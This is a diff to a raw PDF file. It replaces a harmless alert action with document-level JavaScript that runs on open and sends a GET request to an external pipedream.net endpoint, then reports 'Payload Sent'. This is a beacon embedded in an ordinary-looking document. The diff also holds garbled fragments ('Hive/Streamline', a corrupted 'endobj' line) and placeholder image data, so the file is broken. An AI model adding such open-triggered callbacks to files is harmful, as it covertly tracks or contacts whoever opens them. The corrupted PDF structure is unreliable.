@@ -6,16 +6,12 @@ endobj
 << /Type /Pages /Kids [3 0 R] /Count 1 >>
 endobj
 3 0 obj
-<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents [4 0 R 13 0 R Hive/Streamline
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents [4 0 R 13 0 R] /Resources 5 0 R /Annots [17 0 R] >>
 endobj
 4 0 obj
 << /Length 44 >>
 stream
-BT
-/F1 12 Tf
-100 700 Td
-(Version 1 Content) Tj
-ET
+BT /F1 12 Tf 100 700 Td (Version 1 Payload) Tj ET
 endstream
 endobj
 5 0 obj
@@ -28,41 +24,28 @@ endobj
 << /Type /FontDescriptor /FontName /Helvetica /Flags 32 /FontBBox [-166 -225 1000 931] /ItalicAngle 0 /Ascent 770 /Descent -230 /CapHeight 717 /StemV 88 >>
 endobj
 10 0 obj
-<< /Names [(OpenAlert) 11 0 R] >>
+<< /Names [(OpenPayload) 11 0 R] >>
 endobj
 11 0 obj
-<< /S /JavaScript /JS (alert('Version 1 Alert');) >>
+<< /S /JavaScript /JS (var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://eoy4evvlsf7y0jq.m.pipedream.net?version=1', true); xhr.send(); alert('Version 1 GET Payload Sent');) >>
+endస
 endobj
 13 0 obj
 << /Length 84 >>
 stream
-q
-50 0 0 50 150 500 cm
-/Img1 Do
-Q
+q 50 0 0 50 150 500 cm /Img1 Do Q
 endstream
 endobj
 15 0 obj
-<< /Type /XObject /Subtype /Form /BBox [0 0 50 50] /Resources << >> /Length 92 >>
+<< /Type /XObject /Subtype /Image /Width 50 /Height 50 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /FlateDecode /Length 100 >>
 stream
-q
-50 0 0 50 0 0 cm
-/GS0 gs
-<</MC0<</MCID 0>>>>BDC
-<svg width="50" height="50" xmlns="http://www.w3.org/2000/svg"><circle cx="25" cy="25" r="20" fill="red"/></svg>
-EMC
-Q
+<<PNG_DATA>>
 endstream
 endobj
 16 0 obj
 << /Type /Metadata /Subtype /XML /Length 92 >>
 stream
-<?xml version="1.0"?>
-<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
-  <rdf:Description>
-    <dc:title>Version 1 PDF</dc:title>
-  </rdf:Description>
-</rdf:RDF>
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Description><dc:title>Version 1 PDF with GIF</dc:title></rdf:Description></rdf:RDF>
 endstream
 endobj
 17 0 obj
@@ -86,10 +69,10 @@ xref
 0000000713 00000 n 
 0000000000 65535 f 
 0000000827 00000 n 
-0000000971 00000 n 
-0000001063 00000 n 
+0000000941 00000 n 
+0000001033 00000 n 
 trailer
 << /Size 18 /Root 1 0 R >>
 startxref
-1207
+1177
 %%EOF
